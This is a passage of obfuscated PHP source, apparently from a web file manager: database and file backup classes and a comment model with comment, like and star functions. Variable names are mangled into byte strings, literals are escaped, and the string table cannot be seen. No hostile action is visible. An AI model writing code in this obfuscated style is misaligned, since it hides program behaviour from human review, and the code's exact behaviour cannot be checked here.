($İÍè¨š‹ > $¬ƒ· ê) { $¬ƒ· ê = $İÍè¨š‹; } $‰Ï‰–ı¦ = array($çÅ¸Ôğ[852] => $ÊÚ‡†ı´, $çÅ¸Ôğ[847] => 1, $çÅ¸Ôğ[866] => $¬ƒ· ê, $çÅ¸Ôğ[867] => $İÍè¨š‹, $çÅ¸Ôğ[868] => time()); Backup::set($‰Ï‰–ı¦); if ($¬ƒ· ê - $İÍè¨š‹ > 0) { $âº…ñõ = $çÅ¸Ôğ[869]; if (!stristr(I18n::getType(), $çÅ¸Ôğ[870])) { $âº…ñõ = $çÅ¸Ôğ[871]; } Backup::log(array($âº…ñõ, $‰Ï‰–ı¦)); return !1; } return !0; } private function tmpFilesPath() { $˜ü¯×˜» =& $_SERVER[¼¥ÊĞÙÌ]; $©šñöø’ = TEMP_FILES; if ($GLOBALS[$˜ü¯×˜»[6]][$˜ü¯×˜»[92]][$˜ü¯×˜»[872]]) { $©šñöø’ = $GLOBALS[$˜ü¯×˜»[6]][$˜ü¯×˜»[92]][$˜ü¯×˜»[872]]; if (!mk_dir($©šñöø’) || !is_writable($©šñöø’) || !IO::mkfile($©šñöø’ . $˜ü¯×˜»[873])) { $©šñöø’ = TEMP_FILES; } } return $©šñöø’; } } class BackupDbFile { public function __construct() { } public function index() { $ø‚Ô¦Ôó =& $_SERVER[¼¥ÊĞÙÌ]; $ÏºÜòÊÉ = Backup::get(); $€”ÖÉş… = $ÏºÜòÊÉ[$ø‚Ô¦Ôó[32]]; $û‚­¸öñ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\160\x5f{$€”ÖÉş…}\x2f"; $ÚòßÈ¥¶ = $this->backupPath($ÏºÜòÊÉ); if (!($ÚòßÈ¥¶ = IO::mkdir($ÚòßÈ¥¶))) { Backup::log($ø‚Ô¦Ôó[874] . $ÚòßÈ¥¶); return !1; } $òÆÏŸ¡ş = IO::listPath($û‚­¸öñ); $ÉØË²Ÿ« = isset($òÆÏŸ¡ş[$ø‚Ô¦Ôó[86]]) ? $òÆÏŸ¡ş[$ø‚Ô¦Ôó[86]] : array(); $é‹ÔÁÙ· = array_sum(array_column($ÉØË²Ÿ«, $ø‚Ô¦Ôó[79])); if (!$é‹ÔÁÙ·) { Backup::log($ø‚Ô¦Ôó[875] . $û‚­¸öñ); return !1; } $àæ¸¸‰Ş = array($ø‚Ô¦Ôó[876] => $é‹ÔÁÙ·, $ø‚Ô¦Ôó[877] => time()); Backup::set($àæ¸¸‰Ş); $ì‹«ˆ¸š = new TaskFileTransfer($ø‚Ô¦Ôó[878], $ø‚Ô¦Ôó[851], count($ÉØË²Ÿ«), LNG($ø‚Ô¦Ôó[860]) . $ø‚Ô¦Ôó[465] . LNG($ø‚Ô¦Ôó[862]) . $ø‚Ô¦Ôó[879]); $ì‹«ˆ¸š->task[$ø‚Ô¦Ôó[837]] = $é‹ÔÁÙ·; foreach ($òÆÏŸ¡ş[$ø‚Ô¦Ôó[86]] as $–öóÇ¬×) { $â‹İÒ¹Ñ = IO::move($–öóÇ¬×[$ø‚Ô¦Ôó[87]], $ÚòßÈ¥¶); if (!$â‹İÒ¹Ñ) { $ì‹«ˆ¸š->end(); $ŠòÉ¢Šó = IO::getLastError($ø‚Ô¦Ôó[880] . $–öóÇ¬×[$ø‚Ô¦Ôó[87]] . $ø‚Ô¦Ôó[881] . $ÚòßÈ¥¶ . $ø‚Ô¦Ôó[178]); Backup::log($ŠòÉ¢Šó); return !1; } } $ı¯¯í‰Ø = new DbManage(); $ïî¹¾¿ò = $ı¯¯í‰Ø->getSqlFile(); if (!$ïî¹¾¿ò[$ø‚Ô¦Ôó[882]] || !$ïî¹¾¿ò[$ø‚Ô¦Ôó[13]]) { Backup::log($ø‚Ô¦Ôó[883]); return !1; } IO::move($ïî¹¾¿ò[$ø‚Ô¦Ôó[882]], $ÚòßÈ¥¶); IO::move($ïî¹¾¿ò[$ø‚Ô¦Ôó[13]], $ÚòßÈ¥¶); $ì‹«ˆ¸š->end(); $àæ¸¸‰Ş = array($ø‚Ô¦Ôó[884] => $é‹ÔÁÙ·, $ø‚Ô¦Ôó[885] => time()); Backup::set($àæ¸¸‰Ş); return !0; } private function backupPath($½¯İÕ÷Š) { $¦Ø±ñŒ¾ =& $_SERVER[¼¥ÊĞÙÌ]; $÷Ó©‘¨º = $½¯İÕ÷Š[$¦Ø±ñŒ¾[32]]; $ŞÜÅĞ´¢ = Model($¦Ø±ñŒ¾[844])->get($¦Ø±ñŒ¾[845]); $®· å‹ = substr(md5($¦Ø±ñŒ¾[846] . $ŞÜÅĞ´¢ . $÷Ó©‘¨º), 0, 8); return "\x7b\x69\x6f\72{$½¯İÕ÷Š[$¦Ø±ñŒ¾[826]]}\x7d\x2f\144\x61\x74\141\142\x61\x73\x65\x2f\x62\141\x63\153\x75\x70\57" . $÷Ó©‘¨º . $¦Ø±ñŒ¾[11] . $®· å‹; } private function tmpFilesPath() { $ï±²€¯¢ =& $_SERVER[¼¥ÊĞÙÌ]; $¶ñĞ³Š¬ = TEMP_FILES; if ($GLOBALS[$ï±²€¯¢[6]][$ï±²€¯¢[92]][$ï±²€¯¢[872]]) { $¶ñĞ³Š¬ = $GLOBALS[$ï±²€¯¢[6]][$ï±²€¯¢[92]][$ï±²€¯¢[872]]; if (!mk_dir($¶ñĞ³Š¬) || !is_writable($¶ñĞ³Š¬) || !IO::mkfile($¶ñĞ³Š¬ . $ï±²€¯¢[873])) { $¶ñĞ³Š¬ = TEMP_FILES; } } return $¶ñĞ³Š¬; } } class BackupFile { public function __construct() { } public function index() { $ğ ¨ÇÀá = Backup::get(); $èé“—½ = $ğ ¨ÇÀá[$_SERVER[¼¥ÊĞÙÌ][371]][$_SERVER[¼¥ÊĞÙÌ][233]][$_SERVER[¼¥ÊĞÙÌ][546]]; $Œ¡´Ìü² = array($_SERVER[¼¥ÊĞÙÌ][547] => array($_SERVER[¼¥ÊĞÙÌ][886], $èé“—½), $_SERVER[¼¥ÊĞÙÌ][887] => array($_SERVER[¼¥ÊĞÙÌ][409], $ğ ¨ÇÀá[$_SERVER[¼¥ÊĞÙÌ][826]])); $éà½ãğü = (int) Model($_SERVER[¼¥ÊĞÙÌ][865])->where($Œ¡´Ìü²)->count($_SERVER[¼¥ÊĞÙÌ][546]); $­çÕ€˜© = (int) Model($_SERVER[¼¥ÊĞÙÌ][865])->where($Œ¡´Ìü²)->sum($_SERVER[¼¥ÊĞÙÌ][79]); $Ãˆ‘— = new TaskFileTransfer($_SERVER[¼¥ÊĞÙÌ][888], $_SERVER[¼¥ÊĞÙÌ][851], $éà½ãğü, LNG($_SERVER[¼¥ÊĞÙÌ][860]) . $_SERVER[¼¥ÊĞÙÌ][861] . LNG($_SERVER[¼¥ÊĞÙÌ][889])); $Ãˆ‘—->task[$_SERVER[¼¥ÊĞÙÌ][837]] = $­çÕ€˜©; $÷ÕŸ€â® = array($_SERVER[¼¥ÊĞÙÌ][890] => $éà½ãğü, $_SERVER[¼¥ÊĞÙÌ][891] => $­çÕ€˜©, $_SERVER[¼¥ÊĞÙÌ][892] => time()); Backup::set($÷ÕŸ€â®); $åË×Ñ«ß = !0; $½ÜıØ¬ = $this->storeIds(); $Šİ§Ê³ = 1; $·ÕÒÀ = 1000; $˜ñÆñË¹ = $ŸÕ’ÕÖ€ = 0; $¬±Ç„ğÑ = array(); $®ïìÓ = $ˆ¼ÕçŸ• = 0; do { $äÚõÔÛÀ = $_SERVER[¼¥ÊĞÙÌ][893]; $”™» ä = Model($_SERVER[¼¥ÊĞÙÌ][865])->where($Œ¡´Ìü²)->field($äÚõÔÛÀ)->order($_SERVER[¼¥ÊĞÙÌ][894])->selectPage($·ÕÒÀ, $Šİ§Ê³); $¤€ëµğ— = !empty($”™» ä[$_SERVER[¼¥ÊĞÙÌ][448]]) ? $”™» ä[$_SERVER[¼¥ÊĞÙÌ][448]] : array(); foreach ($¤€ëµğ— as $÷Ü€çˆ˜) { if (!$this->_fileExist($÷Ü€çˆ˜, $¬±Ç„ğÑ, $½ÜıØ¬)) { Backup::log($_SERVER[¼¥ÊĞÙÌ][895] . $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][546]] . $_SERVER[¼¥ÊĞÙÌ][896] . $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][87]]); continue; } $øìÓéĞğ = $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][87]]; $ù¨öã¸ = "\x7b\151\157\x3a{$ğ ¨ÇÀá[$_SERVER[¼¥ÊĞÙÌ][826]]}\175" . substr($øìÓéĞğ, strlen("\x7b\151\157\x3a{$÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][897]]}\175")); if (IO::exist($ù¨öã¸)) { $Ãˆ‘—->updateFileEnd($÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][32]], $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][79]]); } else { $ù¨öã¸ = get_path_father($ù¨öã¸); IO::mkdir($ù¨öã¸); if (!IO::copy($øìÓéĞğ, $ù¨öã¸, $_SERVER[¼¥ÊĞÙÌ][898])) { Backup::log($_SERVER[¼¥ÊĞÙÌ][899] . $øìÓéĞğ . $_SERVER[¼¥ÊĞÙÌ][881] . $ù¨öã¸ . $_SERVER[¼¥ÊĞÙÌ][178]); $åË×Ñ«ß = !1; break; } } $èé“—½ = $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][546]]; $ŸÕ’ÕÖ€ += 1; $˜ñÆñË¹ += $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][79]]; $ˆ¼ÕçŸ• += 1; $®ïìÓ += $÷Ü€çˆ˜[$_SERVER[¼¥ÊĞÙÌ][79]]; if ($˜ñÆñË¹ >= 1024 * 1024 * 100) { $÷ÕŸ€â® = array($_SERVER[¼¥ÊĞÙÌ][825] => $èé“—½, $_SERVER[¼¥ÊĞÙÌ][900] => $ˆ¼ÕçŸ•, $_SERVER[¼¥ÊĞÙÌ][901] => $®ïìÓ); Backup::set($÷ÕŸ€â®); $˜ñÆñË¹ = $ŸÕ’ÕÖ€ = 0; } } $Ê…¹Å± = count($¤€ëµğ—); $Šİ§Ê³++; } while ($Ê…¹Å± == $·ÕÒÀ); $Ãˆ‘—->end(); $÷ÕŸ€â® = array($_SERVER[¼¥ÊĞÙÌ][902] => 1, $_SERVER[¼¥ÊĞÙÌ][835] => time(), $_SERVER[¼¥ÊĞÙÌ][849] => 1, $_SERVER[¼¥ÊĞÙÌ][825] => $èé“—½, $_SERVER[¼¥ÊĞÙÌ][903] => time()); if ($ŸÕ’ÕÖ€) { $÷ÕŸ€â®[$_SERVER[¼¥ÊĞÙÌ][900]] = $ˆ¼ÕçŸ•; $÷ÕŸ€â®[$_SERVER[¼¥ÊĞÙÌ][901]] = $®ïìÓ; } Backup::set($÷ÕŸ€â®); return !0; } private function _fileExist($øæØ¯àÜ, &$º¤Ç›øİ, $³ÕğñÒÈ) { $îëÍÓˆ =& $_SERVER[¼¥ÊĞÙÌ]; $Õ¯°é = $øæØ¯àÜ[$îëÍÓˆ[87]]; if (in_array($øæØ¯àÜ[$îëÍÓˆ[546]], $º¤Ç›øİ)) { return !1; } if (!in_array($øæØ¯àÜ[$îëÍÓˆ[897]], $³ÕğñÒÈ)) { return !1; } if (IO::exist($Õ¯°é)) { return !0; } $öÛÎŸ„ = get_path_father($Õ¯°é); if (IO::exist($öÛÎŸ„)) { $º¤Ç›øİ[] = $øæØ¯àÜ[$îëÍÓˆ[546]]; return !1; } $â˜ö¿Åª = array($îëÍÓˆ[897] => $øæØ¯àÜ[$îëÍÓˆ[897]], $îëÍÓˆ[87] => array($îëÍÓˆ[462], "{$öÛÎŸ„}\x25")); $ö³İ‡¼² = Model($îëÍÓˆ[865])->where($â˜ö¿Åª)->field($îëÍÓˆ[547])->select(); $º¤Ç›øİ = array_merge($º¤Ç›øİ, array_to_keyvalue($ö³İ‡¼², $îëÍÓˆ[12], $îëÍÓˆ[546])); return !1; } private function _fileFilter($Âï¥âé†) { $¨®Ô¬˜ =& $_SERVER[¼¥ÊĞÙÌ]; return; if (empty($Âï¥âé†)) { return; } $Çøã = array($¨®Ô¬˜[546] => array($¨®Ô¬˜[7], array_unique($Âï¥âé†))); $ÁïÌ–ùó = Model($¨®Ô¬˜[904])->where($Çøã)->field($¨®Ô¬˜[194])->select(); foreach ($ÁïÌ–ùó as $ÕÎÜö¤ò) { Model($¨®Ô¬˜[904])->remove($ÕÎÜö¤ò[$¨®Ô¬˜[194]], !1); } } private function storeIds() { $åæõóâ =& $_SERVER[¼¥ÊĞÙÌ]; $ä¨‹Ğè“ = Model($åæõóâ[841])->listData(); $§–ÀÎª = array(); $ö¬‚è = $GLOBALS[$åæõóâ[6]][$åæõóâ[92]][$åæõóâ[905]]; foreach ($ä¨‹Ğè“ as $“é¬Á¡Í) { $ÔŠÚÇ‘ = strtolower($“é¬Á¡Í[$åæõóâ[98]]); if (!isset($ö¬‚è[$ÔŠÚÇ‘])) { continue; } $ÀıŞ ƒ‚ = $åæõóâ[77] . (isset($ö¬‚è[$ÔŠÚÇ‘]) ? $ö¬‚è[$ÔŠÚÇ‘] : ucfirst($ÔŠÚÇ‘)); if (!class_exists($ÀıŞ ƒ‚)) { continue; } $§–ÀÎª[] = $“é¬Á¡Í[$åæõóâ[478]]; } return $§–ÀÎª; } } goto bÜ¡“£‡ª‚; c´¾ë¬Î—ƒ: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\156\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\155\x65" => "\x63\157\x6d\155\145\156\164\137\155\145\164\141", "\155\x65\x74\x61\x46\151\145\x6c\144" => "\143\x6f\x6d\155\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($…ÃÈø—÷) { $¸ã¾Îº =& $_SERVER[¼¥ÊĞÙÌ]; if ($…ÃÈø—÷[$¸ã¾Îº[2020]]) { $¨‚—˜Öç = $this->where(array($¸ã¾Îº[2021] => $…ÃÈø—÷[$¸ã¾Îº[2020]]))->find(); if (!$¨‚—˜Öç || $¨‚—˜Öç[$¸ã¾Îº[191]] != $…ÃÈø—÷[$¸ã¾Îº[191]] || $¨‚—˜Öç[$¸ã¾Îº[574]] != $…ÃÈø—÷[$¸ã¾Îº[574]]) { return !1; } $this->where(array($¸ã¾Îº[2021] => $…ÃÈø—÷[$¸ã¾Îº[2020]]))->setAdd($¸ã¾Îº[2022], 1); } $…ÃÈø—÷[$¸ã¾Îº[2023]] = 0; $…ÃÈø—÷[$¸ã¾Îº[2022]] = 0; $…ÃÈø—÷[$¸ã¾Îº[824]] = 1; return $this->add($…ÃÈø—÷); } public function commentCount($ÃŒôìƒì, $œ¦»‹¼ë, $ÓÛˆãà¤ = false) { $ŒÂ££¡Â =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ÃŒôìƒì) { return array(); } if (is_string($ÃŒôìƒì) || is_int($ÃŒôìƒì)) { $ÃŒôìƒì = array($ÃŒôìƒì); } $åÈÙğ = array($ŒÂ££¡Â[574], $ŒÂ££¡Â[2024] => $ŒÂ££¡Â[570]); $Ë·‰¶Ì = array($ŒÂ££¡Â[574] => array($ŒÂ££¡Â[7], $ÃŒôìƒì), $ŒÂ££¡Â[191] => $œ¦»‹¼ë); if ($ÓÛˆãà¤) { $Ë·‰¶Ì[$ŒÂ££¡Â[1790]] = $ÓÛˆãà¤; } $á°áÖ¢– = $this->field($åÈÙğ)->where($Ë·‰¶Ì)->group($ŒÂ££¡Â[574])->select(); return array_to_keyvalue($á°áÖ¢–, $ŒÂ££¡Â[574], $ŒÂ££¡Â[570]); } public function starTarget($Ë…ˆ¯ö”, $ıéı¶) { $Ú¹È„´Î =& $_SERVER[¼¥ÊĞÙÌ]; $—…½á£¤ = $Ë…ˆ¯ö” + self::TYPE_STAR_OFFSET; $†Ö’äò­ = array($Ú¹È„´Î[1790] => USER_ID, $Ú¹È„´Î[191] => $—…½á£¤, $Ú¹È„´Î[574] => $ıéı¶); $¦Â“õ­¨ = $this->where($†Ö’äò­)->find(); if ($¦Â“õ­¨) { return $this->where(array($Ú¹È„´Î[478] => $¦Â“õ­¨[$Ú¹È„´Î[478]]))->delete(); } $Ñå«¶‘£ = array($Ú¹È„´Î[2020] => 0, $Ú¹È„´Î[1790] => USER_ID, $Ú¹È„´Î[824] => 1, $Ú¹È„´Î[171] => $Ú¹È„´Î[12], $Ú¹È„´Î[191] => $—…½á£¤, $Ú¹È„´Î[574] => $ıéı¶, $Ú¹È„´Î[2023] => 0, $Ú¹È„´Î[2022] => 0); return $this->add($Ñå«¶‘£); } public function starTargetCount($ıã”Šû, $¢Í…Éš¯) { $ô¾ØÔ =& $_SERVER[¼¥ÊĞÙÌ]; $üÄªñ§œ = $¢Í…Éš¯ + self::TYPE_STAR_OFFSET; $„»×Û« = $this->commentCount($ıã”Šû, $üÄªñ§œ); $Èı÷ÏÀÂ = $this->commentCount($ıã”Šû, $üÄªñ§œ, USER_ID); return array($ô¾ØÔ[2025] => $„»×Û«, $ô¾ØÔ[2026] => $Èı÷ÏÀÂ); } public function starTargetUserList($Ñë£éÍ, $¯¹õóêÆ) { $ûŠˆŞşÂ =& $_SERVER[¼¥ÊĞÙÌ]; $ÀòôÀ­ = $Ñë£éÍ + self::TYPE_STAR_OFFSET; $¥ğıÏ¶¤ = array($ûŠˆŞşÂ[574] => $¯¹õóêÆ, $ûŠˆŞşÂ[191] => $ÀòôÀ­); $¬ëÒäÔ = $this->where($¥ğıÏ¶¤)->count(); $ÆŞÑŠÊ« = array($ûŠˆŞşÂ[335] => $¬ëÒäÔ, $ûŠˆŞşÂ[2027] => array()); if (!$¬ëÒäÔ) { return $ÆŞÑŠÊ«; } $áİ·¬ïæ = $this->field($ûŠˆŞşÂ[1790])->where($¥ğıÏ¶¤)->limit(500)->select(); $áİ·¬ïæ = array_to_keyvalue($áİ·¬ïæ, $ûŠˆŞşÂ[12], $ûŠˆŞşÂ[1790]); $ÆŞÑŠÊ«[$ûŠˆŞşÂ[2027]] = Model($ûŠˆŞşÂ[582])->userListInfo($áİ·¬ïæ); return $ÆŞÑŠÊ«; } public function prasiseUserList($¾ÅıÇµ²) { $­”‡¤ºÂ =& $_SERVER[¼¥ÊĞÙÌ]; $Âê©´£¹ = array($­”‡¤ºÂ[2028] => $¾ÅıÇµ²); $›æ¥Û‚Ï = $this->where($Âê©´£¹)->find(); $¶½‚¶Ë = _get($›æ¥Û‚Ï, $­”‡¤ºÂ[2023], 0); $‰¶¦Œ´ú = array($­”‡¤ºÂ[335] => $¶½‚¶Ë, $­”‡¤ºÂ[2027] => array()); if (!$¶½‚¶Ë) { return $‰¶¦Œ´ú; } $°±İ²”¶ = Model($­”‡¤ºÂ[2029])->field($­”‡¤ºÂ[1790])->where($Âê©´£¹)->limit(500)->select(); $°±İ²”¶ = array_to_keyvalue($°±İ²”¶, $­”‡¤ºÂ[12], $­”‡¤ºÂ[1790]); $‰¶¦Œ´ú[$­”‡¤ºÂ[2027]] = Model($­”‡¤ºÂ[582])->userListInfo($°±İ²”¶); return $‰¶¦Œ´ú; } public function remove($‚™¾â¼) { $äĞ ¶ü× =& $_SERVER[¼¥ÊĞÙÌ]; $Çï•üÉØ = array($äĞ ¶ü×[2021] => $‚™¾â¼); $¢à„ˆõ = $this->where($Çï•üÉØ)->find(); if ($¢à„ˆõ[$äĞ ¶ü×[2020]]) { $this->where(array($äĞ ¶ü×[2021] => $¢à„ˆõ[$äĞ ¶ü×[2020]]))->setAdd($äĞ ¶ü×[2022], -1); } return $this->where($Çï•üÉØ)->delete(); } public function edit($†áö¼ƒÇ, $ñÊçË÷´) { $êşÒÂÇƒ =& $_SERVER[¼¥ÊĞÙÌ]; $òÊêÒÎ = array($êşÒÂÇƒ[2021] => $†áö¼ƒÇ); return $this->where($òÊêÒÎ)->save(array($êşÒÂÇƒ[2030] => $ñÊçË÷´)); } public function prasise($„½‰ì°) { $•›™îşú =& $_SERVER[¼¥ÊĞÙÌ]; $ê„­„Ì = Model($•›™îşú[2031]); $§›Àç• = array($•›™îşú[2021] => $„½‰ì°, $•›™îşú[1781] => USER_ID); $ÌÀßİõ· = $ê„­„Ì->where($§›Àç•)->find(); if (!$ÌÀßİõ·) { $ê„­„Ì->add($§›Àç•); $—Õ˜ãô = $this->where(array($•›™îşú[2021] => $„½‰ì°))->setAdd($•›™îşú[2023], 1); } else { $ê„­„Ì->where($§›Àç•)->delete(); $—Õ˜ãô = $this->where(array($•›™îşú[2021] => $„½‰ì°))->setAdd($•›™îşú[2023], -1); } return $—Õ˜ãô; } public function targetInfo($­ê®øô‹, $şèÛ½–ï) { $±ı‹î·Ş =& $_SERVER[¼¥ÊĞÙÌ]; $èÒ…¯áì = array($±ı‹î·Ş[656] => $­ê®øô‹, $±ı‹î·Ş[657] => $şèÛ½–ï); $ïÀËªßê = $this->where($èÒ…¯áì)->count(); $ëíãµ°Ë = "\x52\111\107\x48\124\x20\112\117\111\x4e\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\156\x74\137\x70\x72\141\151\x73\x65\x20\x73\164\x61\x72\40\157\156\40\143\x6f\x6d\155\x65\x6e\x74\x2e\143\x6f\x6d\155\x65\x6e\164\x49\104\x20\75\40\x73\164\141\162\56\143\x6f\155\155\145\x6e\164\x49\104"; $»¬”¯ˆ½ = $this->alias($±ı‹î·Ş[432])->where($èÒ…¯áì)->join($ëíãµ°Ë, $±ı‹î·Ş[2032])->count(); $à¦•êäì = array($±ı‹î·Ş[2033] => $ïÀËªßê, $±ı‹î·Ş[2034] => $»¬”¯ˆ½); return $à¦•êäì; } public function listData($¡”©š¸¸) { $ÅÛó¾è =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($¡”©š¸¸[$ÅÛó¾è[2035]])) { if ($¡”©š¸¸[$ÅÛó¾è[2035]]) { $¡”©š¸¸[$ÅÛó¾è[2028]] = array($ÅÛó¾è[1100], intval($¡”©š¸¸[$ÅÛó¾è[2035]])); } unset($¡”©š¸¸[$ÅÛó¾è[2035]]); } if (isset($¡”©š¸¸[$ÅÛó¾è[2036]])) { if ($¡”©š¸¸[$ÅÛó¾è[2036]]) { $¡”©š¸¸[$ÅÛó¾è[2028]] = array($ÅÛó¾è[1097], intval($¡”©š¸¸[$ÅÛó¾è[2036]])); } unset($¡”©š¸¸[$ÅÛó¾è[2036]]); } return $this->_listData($¡”©š¸¸); } private function _listData($×ô…’ğ´) { $µÈ¼¥„Ñ =& $_SERVER[¼¥ÊĞÙÌ]; $›š÷Ş¼Ê = $this->where($×ô…’ğ´)->_makeOrder()->selectPage(100); $this->_listAppendParent($›š÷Ş¼Ê[$µÈ¼¥„Ñ[448]]); $this->_listAppendUser($›š÷Ş¼Ê[$µÈ¼¥„Ñ[448]]); $this->_listAppendMeta($›š÷Ş¼Ê[$µÈ¼¥„Ñ[448]]); return $›š÷Ş¼Ê; } private function _makeOrder() { $ˆ¥ŞõÖÓ =& $_SERVER[¼¥ÊĞÙÌ]; $õó€¼ÁÓ = array($ˆ¥ŞõÖÓ[2023], $ˆ¥ŞõÖÓ[2022], $ˆ¥ŞõÖÓ[234]); $º‹³Ëâ  = Input::get($ˆ¥ŞõÖÓ[533], $ˆ¥ŞõÖÓ[7], $ˆ¥ŞõÖÓ[500], $õó€¼ÁÓ); $¸úĞ¢º = Input::get($ˆ¥ŞõÖÓ[534], $ˆ¥ŞõÖÓ[7], $ˆ¥ŞõÖÓ[1783], array($ˆ¥ŞõÖÓ[2037], $ˆ¥ŞõÖÓ[529])); $ÅÇ³ú´ü = $º‹³Ëâ  . $ˆ¥ŞõÖÓ[53] . $¸úĞ¢º; return $this->order($ÅÇ³ú´ü); } private function _listAppendParent(&$·ú¬Ùé) { $ÄÖ·µÏ =& $_SERVER[¼¥ÊĞÙÌ]; $Ò—ƒÆûá = array_unique(array_to_keyvalue($·ú¬Ùé, $ÄÖ·µÏ[12], $ÄÖ·µÏ[2020])); $Ò—ƒÆûá = array_remove_value($Ò—ƒÆûá, $ÄÖ·µÏ[231]); if (!$Ò—ƒÆûá) { return; } $ÄÁˆÌÀ˜ = $this->where(array($ÄÖ·µÏ[2021] => array($ÄÖ·µÏ[7], $Ò—ƒÆûá)))->select(); $ÄÁˆÌÀ˜ = array_to_keyvalue($ÄÁˆÌÀ˜, $ÄÖ·µÏ[2028]); foreach ($·ú¬Ùé as &$ó‰ÑèÜ­) { if (isset($ÄÁˆÌÀ˜[$ó‰ÑèÜ­[$ÄÖ·µÏ[2020]]])) { $ó‰ÑèÜ­[$ÄÖ·µÏ[2038]] = $ÄÁˆÌÀ˜[$ó‰ÑèÜ­[$ÄÖ·µÏ[2020]]]; } } unset($ó‰ÑèÜ­); } private function _listAppendUser(&$ìÄÉ„Óè) { $ÉöØüŸ¤ =& $_SERVER[¼¥ÊĞÙÌ]; $ƒ‹½Æ¶Š = array_unique(array_to_keyvalue($ìÄÉ„Óè, $ÉöØüŸ¤[12], $ÉöØüŸ¤[1790])); $ƒ‹½Æ¶Š = array_remove_value($ƒ‹½Æ¶Š, $ÉöØüŸ¤[231]); if (count($ƒ‹½Æ¶Š) == 0) { return; } foreach ($ìÄÉ„Óè as $çË‡ø±ä) { if (isset($çË‡ø±ä[$ÉöØüŸ¤[2038]])) { $ƒ‹½Æ¶Š[] = $çË‡ø±ä[$ÉöØüŸ¤[2038]][$ÉöØüŸ¤[1790]]; } } $ù÷‡›¯Ô = Model($ÉöØüŸ¤[602])->userListInfo($ƒ‹½Æ¶Š); foreach ($ìÄÉ„Óè as &$çË‡ø±ä) { $çË‡ø±ä[$ÉöØüŸ¤[670]] = $ù÷‡›¯Ô[$çË‡ø±ä[$ÉöØüŸ¤[1790]]]; if (isset($çË‡ø±ä[$ÉöØüŸ¤[2038]])) { $çË‡ø±ä[$ÉöØüŸ¤[2038]][$ÉöØüŸ¤[670]] = $ù÷‡›¯Ô[$çË‡ø±ä[$ÉöØüŸ¤[2038]][$ÉöØüŸ¤[1790]]]; } } unset($çË‡ø±ä); } private function _listAppendMeta(&$£¢ç¿éÈ) { $ÄäâÜ¼Û =& $_SERVER[¼¥ÊĞÙÌ]; $ûÚí…†ğ = array_unique(array_to_keyvalue($£¢ç¿éÈ, $ÄäâÜ¼Û[12], $ÄäâÜ¼Û[2028])); $ûÚí…†ğ = array_remove_value($ûÚí…†ğ, $ÄäâÜ¼Û[231]); if (!$ûÚí…†ğ) { return; } foreach ($£¢ç¿éÈ as $ÚÔëè¥Ì) { if (isset($ÚÔëè¥Ì[$ÄäâÜ¼Û[2038]])) { $ûÚí…†ğ[] = $ÚÔëè¥Ì[$ÄäâÜ¼Û[2038]][$ÄäâÜ¼Û[2028]]; } } $äè§³ëÔ = $this->metaList($ûÚí…†ğ); if (!$äè§³ëÔ) { return !1; } foreach ($£¢ç¿éÈ as &$ÚÔëè¥Ì) { $ÚÔëè¥Ì[$ÄäâÜ¼Û[544]] = $äè§³ëÔ[$ÚÔëè¥Ì[$ÄäâÜ¼Û[2028]]]; if (isset($ÚÔëè¥Ì[$ÄäâÜ¼Û[2038]])) { $ÚÔëè¥Ì[$ÄäâÜ¼Û[2038]][$ÄäâÜ¼Û[544]] = $äè§³ëÔ[$ÚÔëè¥Ì[$ÄäâÜ¼Û[2038]][$ÄäâÜ¼Û[2028]]]; } } unset($ÚÔëè¥Ì); } private function metaList($Ë°“­Ä) { $å¦èÛõ« =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ë°“­Ä) { return array(); } $¦«•ãö = array($å¦èÛõ«[2028] => array($å¦èÛõ«[7], $Ë°“­Ä)); $¯ÖŠÍÈˆ = Model($å¦èÛõ«[2039])->where($¦«•ãö)->select(); $¯ÖŠÍÈˆ = array_to_keyvalue_group($¯ÖŠÍÈˆ, $å¦èÛõ«[2028]); foreach ($¯ÖŠÍÈˆ as $€ÖÖÅïö => $‚ŸµŸÛ) { $‰™ï¡†¸ = array(); foreach ($‚ŸµŸÛ as $Ö“¿“ä) { $‰™ï¡†¸[$Ö“¿“ä[$å¦èÛõ«[97]]] = $Ö“¿“ä[$å¦èÛõ«[453]]; } $¯ÖŠÍÈˆ[$€ÖÖÅïö] = $‰™ï¡†¸; } return $¯ÖŠÍÈˆ ? $¯ÖŠÍÈˆ : array(); } public function removeTarget($Æ†Ï±Ù³, $¯¼î„¬) { $Ú“™‘ƒÛ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¯¼î„¬) { return !0; } $¯¼î„¬ = is_array($¯¼î„¬) ? $¯¼î„¬ : array($¯¼î„¬); $™§ÈÉîá = array($Ú“™‘ƒÛ[191] => $Æ†Ï±Ù³, $Ú“™‘ƒÛ[574] => array($Ú“™‘ƒÛ[7], $¯¼î„¬)); $×µÖè§ã = $this->field($Ú“™‘ƒÛ[2028])->where($™§ÈÉîá)->select(); $®Í²ÁŠ = array_to_keyvalue($×µÖè§ã, $Ú“™‘ƒÛ[12], $Ú“™‘ƒÛ[2028]); if (!$®Í²ÁŠ) { return !0; } $™§ÈÉîá = array($Ú“™‘ƒÛ[2028] => array($Ú“™‘ƒÛ[7], $®Í²ÁŠ)); $this->where($™§ÈÉîá)->delete(); Model($Ú“™‘ƒÛ[2031])->where($™§ÈÉîá)->delete(); Model($Ú“™‘ƒÛ[2040])->where($™§ÈÉîá)->delete(); } } class FileContentModel 